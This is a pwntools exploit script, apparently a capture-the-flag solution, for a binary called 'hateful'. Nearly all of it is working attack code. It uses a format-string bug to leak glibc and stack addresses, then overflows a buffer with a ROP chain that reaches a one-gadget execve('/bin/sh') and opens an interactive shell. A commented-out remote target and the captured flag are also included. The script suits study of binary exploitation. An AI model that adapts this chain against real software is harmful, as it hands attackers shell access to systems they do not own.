from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./hateful_patched', '''
    b *(send_message+111)
    b *(send_message+183)
    continue
''')

# p = remote('52.59.124.14', 5020)

# Stage 1: leak glibc base address and rbp value with format string
p.sendlineafter(b">> ", b'yay')
p.sendlineafter(b">> ", b'%p%p%p%p%p')
p.recvuntil(b"email provided: ")
addrs = p.recvuntil(b"\n", drop=True)
rbp_val = int(addrs[0:14], 16)+0x2180
glibc_base_addr = int(addrs[-14:], 16)-0x1d2a80
print(f"rbp value: {hex(rbp_val)}")
print(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 2: ROP with one gadget
# 0xd511f execve("/bin/sh", rbp-0x40, r13)
# constraints:
#   address rbp-0x38 is writable
#   rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
#   [r13] == NULL || r13 == NULL || r13 is a valid envp
glibc_r = ROP('./libc.so.6')
chain = [
    glibc_base_addr+glibc_r.rdi.address, 0,
    glibc_base_addr+glibc_r.r13.address, 0,
    glibc_base_addr+0xd511f
]
p.sendlineafter(b"now please provide the message!\n", b'A'*0x3f0+p64(rbp_val)+b''.join([p64(c) for c in chain]))

p.interactive()

# ENO{W3_4R3_50RRY_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}